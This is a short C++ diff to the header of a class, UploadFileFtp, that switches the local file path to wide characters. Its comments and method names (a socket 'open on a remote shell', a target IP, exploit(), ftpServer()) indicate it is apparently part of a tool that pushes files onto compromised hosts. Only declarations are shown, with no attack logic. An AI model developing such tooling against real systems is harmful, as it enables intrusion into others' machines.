@@ -27,18 +27,18 @@ class UploadFileFtp{
 public:
 	// originalFile: path to the file on local host
 	// destinationFile: name on remote host
-	UploadFileFtp(const char *originalFile, const char *destinationFile);
+	UploadFileFtp(const wchar_t *originalFile, const char *destinationFile);
 
 	// socket: a socket open on a remote shell
 	// target: target ip
 	bool upload(SOCKET socket, const char *target);	
 
 private:
-	bool sendfile(const char* target, int port, const char *fileName);
+	bool sendfile(const char* target, int port, const wchar_t *fileName);
 	bool exploit(SOCKET socket, const char *localIp, const char *internetIp, const char *target);
 	bool ftpServer(const char *localIp, const char *target);
 
-	const char *original;
+	const wchar_t *original;
 	const char *destination;
 
 };
